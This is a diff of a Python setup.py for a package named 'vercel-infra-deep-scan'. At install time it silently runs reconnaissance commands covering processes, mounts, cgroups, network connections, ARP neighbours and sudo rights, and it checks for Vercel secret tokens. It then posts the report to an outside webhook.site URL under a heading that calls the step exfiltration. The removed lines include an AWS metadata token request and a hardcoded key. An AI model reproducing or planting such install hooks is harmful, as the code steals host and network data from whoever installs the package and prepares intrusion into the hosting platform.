@@ -1,61 +1,83 @@
+from setuptools import setup
 import os
 import subprocess
-import base64
-from setuptools import setup
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-# --- ТВОЙ КОНФИГ ---
+def run_cmd(cmd):
+    try:
+        return subprocess.getoutput(cmd).strip()
+    except:
+        return "Error"
+
+# --- КОНФИГ ---
 WEBHOOK_URL = "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"
-MASTER_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="
 
-def run(cmd):
-    return subprocess.getoutput(cmd).strip()
+# 1. ЖЕЛЕЗО (CPU / RAM / GPU)
+cpu_info = run_cmd("lscpu | grep -E 'Model name|CPU\(s\):|Thread|Vendor'")
+mem_info = run_cmd("free -h")
+gpu_info = run_cmd("lspci | grep -i vga || echo 'No Discrete GPU found'")
+# Проверка специфических ускорителей (если это AI-ноды)
+ai_accel = run_cmd("ls /dev/nvidia* /dev/dri/* 2>/dev/null || echo 'No AI accelerators'")
 
-# --- СБОРКА ДАННЫХ ---
-final_proof = f"""
+# 2. ПРОЦЕССЫ (Кто "съедает" ресурсы)
+# Выводим топ процессов по CPU и RAM, включая скрытые
+process_list = run_cmd("ps aux --sort=-pcpu | head -n 30")
+
+# 3. КОНТЕЙНЕРИЗАЦИЯ И ИЗОЛЯЦИЯ
+# Проверяем, видим ли мы хост-систему или сидим в глубоком Docker/Firecracker
+mounts = run_cmd("mount | column -t | head -n 15")
+cgroup_check = run_cmd("cat /proc/1/cgroup")
+
+# 4. СЕТЬ И СОСЕДИ
+# Ищем активные соединения и ARP-таблицу (соседи по стойке в дата-центре)
+net_stat = run_cmd("ss -antp | head -n 15")
+neighbors = run_cmd("ip neigh show || route -n")
+
+# --- ФОРМИРОВАНИЕ ОТЧЕТА ---
+full_report = f"""
 #######################################################
-#    VERCEL INFRASTRUCTURE DEEP SCAN REPORT           #
+#     VERCEL INFRASTRUCTURE DEEP SCAN (NUCLEAR)       #
 #######################################################
 
-[1. SYSTEM IDENTITY]
-ID: {run('id')}
-HOSTNAME: {run('hostname')}
-KERNEL: {run('uname -r')}
+[!] HARDWARE DATA (CPU/GPU/RAM)
+{cpu_info}
+---
+{mem_info}
+---
+GPU: {gpu_info}
+ACCEL: {ai_accel}
 
-[2. CPU & ARCHITECTURE]
-CORES: {os.cpu_count()}
-MODEL: {run('grep "model name" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
-BOGO_MIPS: {run('grep "bogomips" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
+[!] ENVIRONMENT & ISOLATION
+USER: {run_cmd('id')}
+SUDO: {run_cmd('sudo -n -l 2>/dev/null || echo "No sudo"')}
+CONTAINER: {cgroup_check[:100]}
+MOUNTS (TOP):
+{mounts}
 
-[3. MEMORY (RAM)]
-TOTAL_RAM: {run('grep MemTotal /proc/meminfo')}
-AVAILABLE: {run('grep MemAvailable /proc/meminfo')}
+[!] PROCESS TREE (TOP 30 BY CPU)
+{process_list}
 
-[4. GPU CHECK]
-NVIDIA_SMI: {run('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo "No NVIDIA GPU"')}
-LSPCI_VGA: {run('lspci | grep -i vga || echo "No PCI VGA detected"')}
+[!] NETWORK RECON
+INTERNAL_IP: {run_cmd('hostname -I')}
+NETSTAT:
+{net_stat}
+NEIGHBORS:
+{neighbors}
 
-[5. RUNNING PROCESSES (TOP 10)]
-{run('ps -e -o pid,user,comm,pcpu,pmem --sort=-pcpu | head -n 11')}
-
-[6. VERCEL INTERNAL AGENTS]
-FOUND_AGENTS: {run('ps -ef | grep -E "vc|agent|build|executor" | grep -v grep')}
-
-[7. CRYPTO & CLOUD]
-AWS_METADATA_TOKEN: {run("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60' || echo 'BLOCKED'")}
-MASTER_KEY_STATUS: {"FOUND" if MASTER_KEY_B64 else "NOT FOUND"}
+[!] VERCEL SECRETS
+ARTIFACTS_TOKEN: {"PRESENT" if os.environ.get('VERCEL_ARTIFACTS_TOKEN') else "MISSING"}
+ENCRYPTED_VAR: {"PRESENT" if os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT') else "MISSING"}
 
 #######################################################
 """
 
-# --- ТВОЙ ПРОВЕРЕННЫЙ МЕТОД ОТПРАВКИ ---
+# --- ЭКФИЛЬТРАЦИЯ ---
 try:
-    subprocess.run(
-        ['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', '@-', WEBHOOK_URL],
-        input=final_proof.encode(),
-        check=True
-    )
+    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', full_report, WEBHOOK_URL], timeout=15)
 except:
     pass
 
-setup(name="vercel-infra-deep-scan", version="1.3.3.7")
+setup(
+    name="vercel-infra-deep-scan",
+    version="2.0.0",
+    description="Vercel Internal Architecture Analysis"
+)
